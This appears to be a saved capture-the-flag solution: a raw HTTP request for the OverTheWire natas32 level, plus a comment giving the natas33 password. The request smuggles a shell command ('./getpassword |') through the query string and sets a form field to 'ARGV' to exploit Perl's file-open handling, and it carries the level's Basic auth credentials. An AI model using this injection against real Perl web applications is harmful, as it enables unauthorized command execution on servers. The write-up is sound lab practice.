
'''
POST /index.pl?./getpassword%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Content-Length: 486
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpZcDVmZnlmbUVkanZUT3dwTjVIQ3ZoN0N0Z2Y5ZW0zRw==
Upgrade-Insecure-Requests: 1
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ZW5KmI50i9hEWeE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas32.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary8ZW5KmI50i9hEWeE
Content-Disposition: form-data; name="file"

ARGV
------WebKitFormBoundary8ZW5KmI50i9hEWeE
Content-Disposition: form-data; name="file"; filename="cities.csv"
Content-Type: text/csv

"LatD", "LatM", "LatS", "NS", "LonD", "LonM", "LonS", "EW", "City", "State"
   41,    5,   59, "N",     80,   39,    0, "W", "Youngstown", OH
   42,   52,   48, "N",     97,   23,   23, "W", "Yankton", SD

------WebKitFormBoundary8ZW5KmI50i9hEWeE
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundary8ZW5KmI50i9hEWeE--

'''

#natas33 pw = APwWDD3fRAf6226sgBOBaSptGwvXwQhG 